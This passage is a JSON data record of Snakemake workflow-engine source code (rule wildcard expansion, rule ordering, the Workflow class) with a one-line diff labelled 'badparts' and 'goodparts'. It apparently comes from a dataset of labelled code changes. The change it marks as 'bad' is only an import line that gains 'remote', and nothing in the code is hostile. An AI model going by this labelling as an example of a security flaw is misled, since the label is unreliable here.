expansion[i].append(IOFile(e, rule=branch))\n                except KeyError:\n                    return None\n\n        # replace the dynamic files with the expanded files\n        replacements = [(i, io[i], e)\n                        for i, e in reversed(list(expansion.items()))]\n        for i, old, exp in replacements:\n            dynamic_io_.remove(old)\n            io_.insert_items(i, exp)\n\n        if not input:\n            for i, old, exp in replacements:\n                if old in branch.temp_output:\n                    branch.temp_output.discard(old)\n                    branch.temp_output.update(exp)\n                if old in branch.protected_output:\n                    branch.protected_output.discard(old)\n                    branch.protected_output.update(exp)\n                if old in branch.touch_output:\n                    branch.touch_output.discard(old)\n                    branch.touch_output.update(exp)\n\n            branch.wildcard_names.clear()\n            non_dynamic_wildcards = dict((name, values[0])\n                                         for name, values in wildcards.items()\n                                         if len(set(values)) == 1)\n            # TODO have a look into how to concretize dependencies here\n            (branch._input, branch._output, branch._params, branch._log,\n             branch._benchmark, _, branch.dependencies\n             ) = branch.expand_wildcards(wildcards=non_dynamic_wildcards)\n            return branch, non_dynamic_wildcards\n        return branch\n\n    def has_wildcards(self):\n        \"\"\"\n        Return True if rule contains wildcards.\n        \"\"\"\n        return bool(self.wildcard_names)\n\n    @property\n    def benchmark(self):\n        return self._benchmark\n\n    @benchmark.setter\n    def benchmark(self, benchmark):\n        self._benchmark = IOFile(benchmark, rule=self)\n\n    @property\n    def input(self):\n        return self._input\n\n    def set_input(self, *input, **kwinput):\n        \"\"\"\n        Add a list of input files. Recursive lists are flattened.\n\n        Arguments\n        input -- the list of input files\n        \"\"\"\n        for item in input:\n            self._set_inoutput_item(item)\n        for name, item in kwinput.items():\n            self._set_inoutput_item(item, name=name)\n\n    @property\n    def output(self):\n        return self._output\n\n    @property\n    def products(self):\n        products = list(self.output)\n        if self.benchmark:\n            products.append(self.benchmark)\n        return products\n\n    def set_output(self, *output, **kwoutput):\n        \"\"\"\n        Add a list of output files. Recursive lists are flattened.\n\n        Arguments\n        output -- the list of output files\n        \"\"\"\n        for item in output:\n            self._set_inoutput_item(item, output=True)\n        for name, item in kwoutput.items():\n            self._set_inoutput_item(item, output=True, name=name)\n\n        for item in self.output:\n            if self.dynamic_output and item not in self.dynamic_output:\n                raise SyntaxError(\n                    \"A rule with dynamic output may not define any \"\n                    \"non-dynamic output files.\")\n            wildcards = item.get_wildcard_names()\n            if self.wildcard_names:\n                if self.wildcard_names != wildcards:\n                    raise SyntaxError(\n                        \"Not all output files of rule {} \"\n                        \"contain the same wildcards.\".format(self.name))\n            else:\n                self.wildcard_names = wildcards\n\n    def _set_inoutput_item(self, item, output=False, name=None):\n        \"\"\"\n        Set an item to be input or output.\n\n        Arguments\n        item     -- the item\n        inoutput -- either a Namedlist of input or output items\n        name     -- an optional name for the item\n        \"\"\"\n        inoutput = self.output if output else self.input\n        if isinstance(item, str):\n            # add the rule to the dependencies\n            if isinstance(item, _IOFile):\n                self.dependencies[item] = item.rule\n            _item = IOFile(item, rule=self)\n            if is_flagged(item, \"temp\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be temporary\")\n                self.temp_output.add(_item)\n            if is_flagged(item, \"protected\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be protected\")\n                self.protected_output.add(_item)\n            if is_flagged(item, \"touch\"):\n                if not output:\n                    raise SyntaxError(\n                        \"Only output files may be marked for touching.\")\n                self.touch_output.add(_item)\n            if is_flagged(item, \"dynamic\"):\n                if output:\n                    self.dynamic_output.add(_item)\n                else:\n                    self.dynamic_input.add(_item)\n            if is_flagged(item, \"subworkflow\"):\n                if output:\n                    raise SyntaxError(\n                        \"Only input files may refer to a subworkflow\")\n                else:\n                    # record the workflow this item comes from\n                    self.subworkflow_input[_item] = item.flags[\"subworkflow\"]\n            inoutput.append(_item)\n            if name:\n                inoutput.add_name(name)\n        elif callable(item):\n            if output:\n                raise SyntaxError(\n                    \"Only input files can be specified as functions\")\n            inoutput.append(item)\n            if name:\n                inoutput.add_name(name)\n        else:\n            try:\n                start = len(inoutput)\n                for i in item:\n                    self._set_inoutput_item(i, output=output)\n                if name:\n                    # if the list was named, make it accessible\n                    inoutput.set_name(name, start, end=len(inoutput))\n            except TypeError:\n                raise SyntaxError(\n                    \"Input and output files have to be specified as strings or lists of strings.\")\n\n    @property\n    def params(self):\n        return self._params\n\n    def set_params(self, *params, **kwparams):\n        for item in params:\n            self._set_params_item(item)\n        for name, item in kwparams.items():\n            self._set_params_item(item, name=name)\n\n    def _set_params_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.params.append(item)\n            if name:\n                self.params.add_name(name)\n        else:\n            try:\n                start = len(self.params)\n                for i in item:\n                    self._set_params_item(i)\n                if name:\n                    self.params.set_name(name, start, end=len(self.params))\n            except TypeError:\n                raise SyntaxError(\"Params have to be specified as strings.\")\n\n    @property\n    def log(self):\n        return self._log\n\n    def set_log(self, *logs, **kwlogs):\n        for item in logs:\n            self._set_log_item(item)\n        for name, item in kwlogs.items():\n            self._set_log_item(item, name=name)\n\n    def _set_log_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.log.append(IOFile(item,\n                                   rule=self)\n                            if isinstance(item, str) else item)\n            if name:\n                self.log.add_name(name)\n        else:\n            try:\n                start = len(self.log)\n                for i in item:\n                    self._set_log_item(i)\n                if name:\n                    self.log.set_name(name, start, end=len(self.log))\n            except TypeError:\n                raise SyntaxError(\"Log files have to be specified as strings.\")\n\n    def expand_wildcards(self, wildcards=None):\n        \"\"\"\n        Expand wildcards depending on the requested output\n        or given wildcards dict.\n        \"\"\"\n\n        def concretize_iofile(f, wildcards):\n            if not isinstance(f, _IOFile):\n                return IOFile(f, rule=self)\n            else:\n                return f.apply_wildcards(wildcards,\n                                         fill_missing=f in self.dynamic_input,\n                                         fail_dynamic=self.dynamic_output)\n\n        def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj,\n                             concretize=apply_wildcards,\n                             ruleio=None):\n            for name, item in olditems.allitems():\n                start = len(newitems)\n                is_iterable = True\n                if callable(item):\n                    try:\n                        item = item(wildcards_obj)\n                    except (Exception, BaseException) as e:\n                        raise InputFunctionException(e, rule=self)\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        if not isinstance(item_, str):\n                            raise RuleException(\n                                \"Input function did not return str or list of str.\",\n                                rule=self)\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                else:\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                if name:\n                    newitems.set_name(\n                        name, start,\n                        end=len(newitems) if is_iterable else None)\n\n        if wildcards is None:\n            wildcards = dict()\n        missing_wildcards = self.wildcard_names - set(wildcards.keys())\n\n        if missing_wildcards:\n            raise RuleException(\n                \"Could not resolve wildcards in rule {}:\\n{}\".format(\n                    self.name, \"\\n\".join(self.wildcard_names)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n        ruleio = dict()\n\n        try:\n            input = InputFiles()\n            wildcards_obj = Wildcards(fromdict=wildcards)\n            _apply_wildcards(input, self.input, wildcards, wildcards_obj,\n                             concretize=concretize_iofile,\n                             ruleio=ruleio)\n\n            params = Params()\n            _apply_wildcards(params, self.params, wildcards, wildcards_obj)\n\n            output = OutputFiles(o.apply_wildcards(wildcards)\n                                 for o in self.output)\n            output.take_names(self.output.get_names())\n\n            dependencies = {\n                None if f is None else f.apply_wildcards(wildcards): rule\n                for f, rule in self.dependencies.items()\n            }\n\n            ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output)))\n\n            log = Log()\n            _apply_wildcards(log, self.log, wildcards, wildcards_obj,\n                             concretize=concretize_iofile)\n\n            benchmark = self.benchmark.apply_wildcards(\n                wildcards) if self.benchmark else None\n            return input, output, params, log, benchmark, ruleio, dependencies\n        except WildcardError as ex:\n            # this can only happen if an input contains an unresolved wildcard.\n            raise RuleException(\n                \"Wildcards in input, params, log or benchmark file of rule {} cannot be \"\n                \"determined from output files:\\n{}\".format(self, str(ex)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n    def is_producer(self, requested_output):\n        \"\"\"\n        Returns True if this rule is a producer of the requested output.\n        \"\"\"\n        try:\n            for o in self.products:\n                if o.match(requested_output):\n                    return True\n            return False\n        except sre_constants.error as ex:\n            raise IOFileException(\"{} in wildcard statement\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n        except ValueError as ex:\n            raise IOFileException(\"{}\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n\n    def get_wildcards(self, requested_output):\n        \"\"\"\n        Update the given wildcard dictionary by matching regular expression\n        output files to the requested concrete ones.\n\n        Arguments\n        wildcards -- a dictionary of wildcards\n        requested_output -- a concrete filepath\n        \"\"\"\n        if requested_output is None:\n            return dict()\n        bestmatchlen = 0\n        bestmatch = None\n\n        for o in self.products:\n            match = o.match(requested_output)\n            if match:\n                l = self.get_wildcard_len(match.groupdict())\n                if not bestmatch or bestmatchlen > l:\n                    bestmatch = match.groupdict()\n                    bestmatchlen = l\n        return bestmatch\n\n    @staticmethod\n    def get_wildcard_len(wildcards):\n        \"\"\"\n        Return the length of the given wildcard values.\n\n        Arguments\n        wildcards -- a dict of wildcards\n        \"\"\"\n        return sum(map(len, wildcards.values()))\n\n    def __lt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp < 0\n\n    def __gt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp > 0\n\n    def __str__(self):\n        return self.name\n\n    def __hash__(self):\n        return self.name.__hash__()\n\n    def __eq__(self, other):\n        return self.name == other.name\n\n\nclass Ruleorder:\n    def __init__(self):\n        self.order = list()\n\n    def add(self, *rulenames):\n        \"\"\"\n        Records the order of given rules as rule1 > rule2 > rule3, ...\n        \"\"\"\n        self.order.append(list(rulenames))\n\n    def compare(self, rule1, rule2):\n        \"\"\"\n        Return whether rule2 has a higher priority than rule1.\n        \"\"\"\n        # try the last clause first,\n        # i.e. clauses added later overwrite those before.\n        for clause in reversed(self.order):\n            try:\n                i = clause.index(rule1.name)\n                j = clause.index(rule2.name)\n                # rules with higher priority should have a smaller index\n                comp = j - i\n                if comp < 0:\n                    comp = -1\n                elif comp > 0:\n                    comp = 1\n                return comp\n            except ValueError:\n                pass\n\n        # if not ruleorder given, prefer rule without wildcards\n        wildcard_cmp = rule2.has_wildcards() - rule1.has_wildcards()\n        if wildcard_cmp != 0:\n            return wildcard_cmp\n\n        return 0\n\n    def __iter__(self):\n        return self.order.__iter__()\n"}, "/snakemake/workflow.py": {"changes": [{"diff": "\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import upd", "add": 1, "remove": 1, "filename": "/snakemake/workflow.py", "badparts": ["from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch"], "goodparts": ["from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import re import os import sys import signal import json import urllib from collections import OrderedDict from itertools import filterfalse, chain from functools import partial from operator import attrgetter from snakemake.logging import logger, format_resources, format_resource_names from snakemake.rules import Rule, Ruleorder from snakemake.exceptions import RuleException, CreateRuleException, \\ UnknownRuleException, NoRulesException, print_exception, WorkflowError from snakemake.shell import shell from snakemake.dag import DAG from snakemake.scheduler import JobScheduler from snakemake.parser import parse import snakemake.io from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch from snakemake.persistence import Persistence from snakemake.utils import update_config class Workflow: def __init__(self, snakefile=None, snakemakepath=None, jobscript=None, overwrite_shellcmd=None, overwrite_config=dict(), overwrite_workdir=None, overwrite_configfile=None, config_args=None, debug=False): \"\"\" Create the controller. \"\"\" self._rules=OrderedDict() self.first_rule=None self._workdir=None self.overwrite_workdir=overwrite_workdir self.workdir_init=os.path.abspath(os.curdir) self._ruleorder=Ruleorder() self._localrules=set() self.linemaps=dict() self.rule_count=0 self.basedir=os.path.dirname(snakefile) self.snakefile=os.path.abspath(snakefile) self.snakemakepath=snakemakepath self.included=[] self.included_stack=[] self.jobscript=jobscript self.persistence=None self.global_resources=None self.globals=globals() self._subworkflows=dict() self.overwrite_shellcmd=overwrite_shellcmd self.overwrite_config=overwrite_config self.overwrite_configfile=overwrite_configfile self.config_args=config_args self._onsuccess=lambda log: None self._onerror=lambda log: None self.debug=debug global config config=dict() config.update(self.overwrite_config) global rules rules=Rules() @property def subworkflows(self): return self._subworkflows.values() @property def rules(self): return self._rules.values() @property def concrete_files(self): return( file for rule in self.rules for file in chain(rule.input, rule.output) if not callable(file) and not file.contains_wildcard() ) def check(self): for clause in self._ruleorder: for rulename in clause: if not self.is_rule(rulename): raise UnknownRuleException( rulename, prefix=\"Error in ruleorder definition.\") def add_rule(self, name=None, lineno=None, snakefile=None): \"\"\" Add a rule. \"\"\" if name is None: name=str(len(self._rules) +1) if self.is_rule(name): raise CreateRuleException( \"The name{} is already used by another rule\".format(name)) rule=Rule(name, self, lineno=lineno, snakefile=snakefile) self._rules[rule.name]=rule self.rule_count +=1 if not self.first_rule: self.first_rule=rule.name return name def is_rule(self, name): \"\"\" Return True if name is the name of a rule. Arguments name --a name \"\"\" return name in self._rules def get_rule(self, name): \"\"\" Get rule by name. Arguments name --the name of the rule \"\"\" if not self._rules: raise NoRulesException() if not name in self._rules: raise UnknownRuleException(name) return self._rules[name] def list_rules(self, only_targets=False): rules=self.rules if only_targets: rules=filterfalse(Rule.has_wildcards, rules) for rule in rules: logger.rule_info(name=rule.name, docstring=rule.docstring) def list_resources(self): for resource in set( resource for rule in self.rules for resource in rule.resources): if resource not in \"_cores _nodes\".split(): logger.info(resource) def is_local(self, rule): return rule.name in self._localrules or rule.norun def execute(self, targets=None, dryrun=False, touch=False, cores=1, nodes=1, local_cores=1, forcetargets=False, forceall=False, forcerun=None, prioritytargets=None, quiet=False, keepgoing=False, printshellcmds=False, printreason=False, printdag=False, cluster=None, cluster_config=None, cluster_sync=None, jobname=None, immediate_submit=False, ignore_ambiguity=False, printrulegraph=False, printd3dag=False, drmaa=None, stats=None, force_incomplete=False, ignore_incomplete=False, list_version_changes=False, list_code_changes=False, list_input_changes=False, list_params_changes=False, summary=False, detailed_summary=False, latency_wait=3, benchmark_repeats=3, wait_for_files=None, nolock=False, unlock=False, resources=None, notemp=False, nodeps=False, cleanup_metadata=None, subsnakemake=None, updated_files=None, keep_target_files=False, allowed_rules=None, greediness=1.0, no_hooks=False): self.global_resources=dict() if resources is None else resources self.global_resources[\"_cores\"]=cores self.global_resources[\"_nodes\"]=nodes def rules(items): return map(self._rules.__getitem__, filter(self.is_rule, items)) if keep_target_files: def files(items): return filterfalse(self.is_rule, items) else: def files(items): return map(os.path.relpath, filterfalse(self.is_rule, items)) if not targets: targets=[self.first_rule ] if self.first_rule is not None else list() if prioritytargets is None: prioritytargets=list() if forcerun is None: forcerun=list() priorityrules=set(rules(prioritytargets)) priorityfiles=set(files(prioritytargets)) forcerules=set(rules(forcerun)) forcefiles=set(files(forcerun)) targetrules=set(chain(rules(targets), filterfalse(Rule.has_wildcards, priorityrules), filterfalse(Rule.has_wildcards, forcerules))) targetfiles=set(chain(files(targets), priorityfiles, forcefiles)) if forcetargets: forcefiles.update(targetfiles) forcerules.update(targetrules) rules=self.rules if allowed_rules: rules=[rule for rule in rules if rule.name in set(allowed_rules)] if wait_for_files is not None: try: snakemake.io.wait_for_files(wait_for_files, latency_wait=latency_wait) except IOError as e: logger.error(str(e)) return False dag=DAG( self, rules, dryrun=dryrun, targetfiles=targetfiles, targetrules=targetrules, forceall=forceall, forcefiles=forcefiles, forcerules=forcerules, priorityfiles=priorityfiles, priorityrules=priorityrules, ignore_ambiguity=ignore_ambiguity, force_incomplete=force_incomplete, ignore_incomplete=ignore_incomplete or printdag or printrulegraph, notemp=notemp) self.persistence=Persistence( nolock=nolock, dag=dag, warn_only=dryrun or printrulegraph or printdag or summary or list_version_changes or list_code_changes or list_input_changes or list_params_changes) if cleanup_metadata: for f in cleanup_metadata: self.persistence.cleanup_metadata(f) return True dag.init() dag.check_dynamic() if unlock: try: self.persistence.cleanup_locks() logger.info(\"Unlocking working directory.\") return True except IOError: logger.error(\"Error: Unlocking the directory{} failed. Maybe \" \"you don't have the permissions?\") return False try: self.persistence.lock() except IOError: logger.error( \"Error: Directory cannot be locked. Please make \" \"sure that no other Snakemake process is trying to create \" \"the same files in the following directory:\\n{}\\n\" \"If you are sure that no other \" \"instances of snakemake are running on this directory, \" \"the remaining lock was likely caused by a kill signal or \" \"a power loss. It can be removed with \" \"the --unlock argument.\".format(os.getcwd())) return False if self.subworkflows and not printdag and not printrulegraph: globals_backup=dict(self.globals) for subworkflow in self.subworkflows: subworkflow_targets=subworkflow.targets(dag) updated=list() if subworkflow_targets: logger.info( \"Executing subworkflow{}.\".format(subworkflow.name)) if not subsnakemake(subworkflow.snakefile, workdir=subworkflow.workdir, targets=subworkflow_targets, updated_files=updated): return False dag.updated_subworkflow_files.update(subworkflow.target(f) for f in updated) else: logger.info(\"Subworkflow{}: Nothing to be done.\".format( subworkflow.name)) if self.subworkflows: logger.info(\"Executing main workflow.\") self.globals.update(globals_backup) dag.check_incomplete() dag.postprocess() if nodeps: missing_input=[f for job in dag.targetjobs for f in job.input if dag.needrun(job) and not os.path.exists(f)] if missing_input: logger.error( \"Dependency resolution disabled(--nodeps) \" \"but missing input \" \"files detected. If this happens on a cluster, please make sure \" \"that you handle the dependencies yourself or turn of \" \"--immediate-submit. Missing input files:\\n{}\".format( \"\\n\".join(missing_input))) return False updated_files.extend(f for job in dag.needrun_jobs for f in job.output) if printd3dag: dag.d3dag() return True elif printdag: print(dag) return True elif printrulegraph: print(dag.rule_dot()) return True elif summary: print(\"\\n\".join(dag.summary(detailed=False))) return True elif detailed_summary: print(\"\\n\".join(dag.summary(detailed=True))) return True elif list_version_changes: items=list( chain(*map(self.persistence.version_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_code_changes: items=list(chain(*map(self.persistence.code_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_input_changes: items=list(chain(*map(self.persistence.input_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_params_changes: items=list( chain(*map(self.persistence.params_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True scheduler=JobScheduler(self, dag, cores, local_cores=local_cores, dryrun=dryrun, touch=touch, cluster=cluster, cluster_config=cluster_config, cluster_sync=cluster_sync, jobname=jobname, immediate_submit=immediate_submit, quiet=quiet, keepgoing=keepgoing, drmaa=drmaa, printreason=printreason, printshellcmds=printshellcmds, latency_wait=latency_wait, benchmark_repeats=benchmark_repeats, greediness=greediness) if not dryrun and not quiet: if len(dag): if cluster or cluster_sync or drmaa: logger.resources_info( \"Provided cluster nodes:{}\".format(nodes)) else: logger.resources_info(\"Provided cores:{}\".format(cores)) logger.resources_info(\"Rules claiming more threads will be scaled down.\") provided_resources=format_resources(resources) if provided_resources: logger.resources_info( \"Provided resources: \" +provided_resources) ignored_resources=format_resource_names( set(resource for job in dag.needrun_jobs for resource in job.resources_dict if resource not in resources)) if ignored_resources: logger.resources_info( \"Ignored resources: \" +ignored_resources) logger.run_info(\"\\n\".join(dag.stats())) else: logger.info(\"Nothing to be done.\") if dryrun and not len(dag): logger.info(\"Nothing to be done.\") success=scheduler.schedule() if success: if dryrun: if not quiet and len(dag): logger.run_info(\"\\n\".join(dag.stats())) elif stats: scheduler.stats.to_json(stats) if not dryrun and not no_hooks: self._onsuccess(logger.get_logfile()) return True else: if not dryrun and not no_hooks: self._onerror(logger.get_logfile()) return False def include(self, snakefile, overwrite_first_rule=False, print_compilation=False, overwrite_shellcmd=None): \"\"\" Include a snakefile. \"\"\" if not urllib.parse.urlparse(snakefile).scheme: if not os.path.isabs(snakefile) and self.included_stack: current_path=os.path.dirname(self.included_stack[-1]) snakefile=os.path.join(current_path, snakefile) snakefile=os.path.abspath(snakefile) if snakefile in self.included: logger.info(\"Multiple include of{} ignored\".format(snakefile)) return self.included.append(snakefile) self.included_stack.append(snakefile) global workflow workflow=self first_rule=self.first_rule code, linemap=parse(snakefile, overwrite_shellcmd=self.overwrite_shellcmd) if print_compilation: print(code) sys.path.insert(0, os.path.dirname(snakefile)) self.linemaps[snakefile]=linemap exec(compile(code, snakefile, \"exec\"), self.globals) if not overwrite_first_rule: self.first_rule=first_rule self.included_stack.pop() def onsuccess(self, func): self._onsuccess=func def onerror(self, func): self._onerror=func def workdir(self, workdir): if self.overwrite_workdir is None: if not os.path.exists(workdir): os.makedirs(workdir) self._workdir=workdir os.chdir(workdir) def configfile(self, jsonpath): \"\"\" Update the global config with the given dictionary. \"\"\" global config c=snakemake.io.load_configfile(jsonpath) update_config(config, c) update_config(config, self.overwrite_config) def ruleorder(self, *rulenames): self._ruleorder.add(*rulenames) def subworkflow(self, name, snakefile=None, workdir=None): sw=Subworkflow(self, name, snakefile, workdir) self._subworkflows[name]=sw self.globals[name]=sw.target def localrules(self, *rulenames): self._localrules.update(rulenames) def rule(self, name=None, lineno=None, snakefile=None): name=self.add_rule(name, lineno, snakefile) rule=self.get_rule(name) def decorate(ruleinfo): if ruleinfo.input: rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1]) if ruleinfo.output: rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1]) if ruleinfo.params: rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1]) if ruleinfo.threads: if not isinstance(ruleinfo.threads, int): raise RuleException(\"Threads value has to be an integer.\", rule=rule) rule.resources[\"_cores\"]=ruleinfo.threads if ruleinfo.resources: args, resources=ruleinfo.resources if args: raise RuleException(\"Resources have to be named.\") if not all(map(lambda r: isinstance(r, int), resources.values())): raise RuleException( \"Resources values have to be integers.\", rule=rule) rule.resources.update(resources) if ruleinfo.priority: if(not isinstance(ruleinfo.priority, int) and not isinstance(ruleinfo.priority, float)): raise RuleException(\"Priority values have to be numeric.\", rule=rule) rule.priority=ruleinfo.priority if ruleinfo.version: rule.version=ruleinfo.version if ruleinfo.log: rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1]) if ruleinfo.message: rule.message=ruleinfo.message if ruleinfo.benchmark: rule.benchmark=ruleinfo.benchmark rule.norun=ruleinfo.norun rule.docstring=ruleinfo.docstring rule.run_func=ruleinfo.func rule.shellcmd=ruleinfo.shellcmd ruleinfo.func.__name__=\"__{}\".format(name) self.globals[ruleinfo.func.__name__]=ruleinfo.func setattr(rules, name, rule) return ruleinfo.func return decorate def docstring(self, string): def decorate(ruleinfo): ruleinfo.docstring=string return ruleinfo return decorate def input(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.input=(paths, kwpaths) return ruleinfo return decorate def output(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.output=(paths, kwpaths) return ruleinfo return decorate def params(self, *params, **kwparams): def decorate(ruleinfo): ruleinfo.params=(params, kwparams) return ruleinfo return decorate def message(self, message): def decorate(ruleinfo): ruleinfo.message=message return ruleinfo return decorate def benchmark(self, benchmark): def decorate(ruleinfo): ruleinfo.benchmark=benchmark return ruleinfo return decorate def threads(self, threads): def decorate(ruleinfo): ruleinfo.threads=threads return ruleinfo return decorate def resources(self, *args, **resources): def decorate(ruleinfo): ruleinfo.resources=(args, resources) return ruleinfo return decorate def priority(self, priority): def decorate(ruleinfo): ruleinfo.priority=priority return ruleinfo return decorate def version(self, version): def decorate(ruleinfo): ruleinfo.version=version return ruleinfo return decorate def log(self, *logs, **kwlogs): def decorate(ruleinfo): ruleinfo.log=(logs, kwlogs) return ruleinfo return decorate def shellcmd(self, cmd): def decorate(ruleinfo): ruleinfo.shellcmd=cmd return ruleinfo return decorate def norun(self): def decorate(ruleinfo): ruleinfo.norun=True return ruleinfo return decorate def run(self, func): return RuleInfo(func) @staticmethod def _empty_decorator(f): return f class RuleInfo: def __init__(self, func): self.func=func self.shellcmd=None self.norun=False self.input=None self.output=None self.params=None self.message=None self.benchmark=None self.threads=None self.resources=None self.priority=None self.version=None self.log=None self.docstring=None class Subworkflow: def __init__(self, workflow, name, snakefile, workdir): self.workflow=workflow self.name=name self._snakefile=snakefile self._workdir=workdir @property def snakefile(self): if self._snakefile is None: return os.path.abspath(os.path.join(self.workdir, \"Snakefile\")) if not os.path.isabs(self._snakefile): return os.path.abspath(os.path.join(self.workflow.basedir, self._snakefile)) return self._snakefile @property def workdir(self): workdir=\".\" if self._workdir is None else self._workdir if not os.path.isabs(workdir): return os.path.abspath(os.path.join(self.workflow.basedir, workdir)) return workdir def target(self, paths): if not_iterable(paths): return flag(os.path.join(self.workdir, paths), \"subworkflow\", self) return[self.target(path) for path in paths] def targets(self, dag): return[f for job in dag.jobs for f in job.subworkflow_input if job.subworkflow_input[f] is self] class Rules: \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\" pass def srcdir(path): \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\" if not workflow.included_stack: return None return os.path.join(os.path.dirname(workflow.included_stack[-1]), path) ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport re\nimport os\nimport sys\nimport signal\nimport json\nimport urllib\nfrom collections import OrderedDict\nfrom itertools import filterfalse, chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.logging import logger, format_resources, format_resource_names\nfrom snakemake.rules import Rule, Ruleorder\nfrom snakemake.exceptions import RuleException, CreateRuleException, \\\n    UnknownRuleException, NoRulesException, print_exception, WorkflowError\nfrom snakemake.shell import shell\nfrom snakemake.dag import DAG\nfrom snakemake.scheduler import JobScheduler\nfrom snakemake.parser import parse\nimport snakemake.io\nfrom snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\nfrom snakemake.persistence import Persistence\nfrom snakemake.utils import update_config\n\n\nclass Workflow:\n    def __init__(self,\n                 snakefile=None,\n                 snakemakepath=None,\n                 jobscript=None,\n                 overwrite_shellcmd=None,\n                 overwrite_config=dict(),\n                 overwrite_workdir=None,\n                 overwrite_configfile=None,\n                 config_args=None,\n                 debug=False):\n        \"\"\"\n        Create the controller.\n        \"\"\"\n        self._rules = OrderedDict()\n        self.first_rule = None\n        self._workdir = None\n        self.overwrite_workdir = overwrite_workdir\n        self.workdir_init = os.path.abspath(os.curdir)\n        self._ruleorder = Ruleorder()\n        self._localrules = set()\n        self.linemaps = dict()\n        self.rule_count = 0\n        self.basedir = os.path.dirname(snakefile)\n        self.snakefile = os.path.abspath(snakefile)\n        self.snakemakepath = snakemakepath\n        self.included = []\n        self.included_stack = []\n        self.jobscript = jobscript\n        self.persistence = None\n        self.global_resources = None\n        self.globals = globals()\n        self._subworkflows = dict()\n        self.overwrite_shellcmd = overwrite_shellcmd\n        self.overwrite_config = overwrite_config\n        self.overwrite_configfile = overwrite_configfile\n        self.config_args = config_args\n        self._onsuccess = lambda log: None\n        self._onerror = lambda log: None\n        self.debug = debug\n\n        global config\n        config = dict()\n        config.update(self.overwrite_config)\n\n        global rules\n        rules = Rules()\n\n    @property\n    def subworkflows(self):\n        return self._subworkflows.values()\n\n    @property\n    def rules(self):\n        return self._rules.values()\n\n    @property\n    def concrete_files(self):\n        return (\n            file\n            for rule in self.rules for file in chain(rule.input, rule.output)\n            if not callable(file) and not file.contains_wildcard()\n        )\n\n    def check(self):\n        for clause in self._ruleorder:\n            for rulename in clause:\n                if not self.is_rule(rulename):\n                    raise UnknownRuleException(\n                        rulename,\n                        prefix=\"Error in ruleorder definition.\")\n\n    def add_rule(self, name=None, lineno=None, snakefile=None):\n        \"\"\"\n        Add a rule.\n        \"\"\"\n        if name is None:\n            name = str(len(self._rules) + 1)\n        if self.is_rule(name):\n            raise CreateRuleException(\n                \"The name {} is already used by another rule\".format(name))\n        rule = Rule(name, self, lineno=lineno, snakefile=snakefile)\n        self._rules[rule.name] = rule\n        self.rule_count += 1\n        if not self.first_rule:\n            self.first_rule = rule.name\n        return name\n\n    def is_rule(self, name):\n        \"\"\"\n        Return True if name is the name of a rule.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        return name in self._rules\n\n    def get_rule(self, name):\n        \"\"\"\n        Get rule by name.\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if not self._rules:\n            raise NoRulesException()\n        if not name in self._rules:\n            raise UnknownRuleException(name)\n        return self._rules[name]\n\n    def list_rules(self, only_targets=False):\n        rules = self.rules\n        if only_targets:\n            rules = filterfalse(Rule.has_wildcards, rules)\n        for rule in rules:\n            logger.rule_info(name=rule.name, docstring=rule.docstring)\n\n    def list_resources(self):\n        for resource in set(\n            resource for rule in self.rules for resource in rule.resources):\n            if resource not in \"_cores _nodes\".split():\n                logger.info(resource)\n\n    def is_local(self, rule):\n        return rule.name in self._localrules or rule.norun\n\n    def execute(self,\n                targets=None,\n                dryrun=False,\n                touch=False,\n                cores=1,\n                nodes=1,\n                local_cores=1,\n                forcetargets=False,\n                forceall=False,\n                forcerun=None,\n                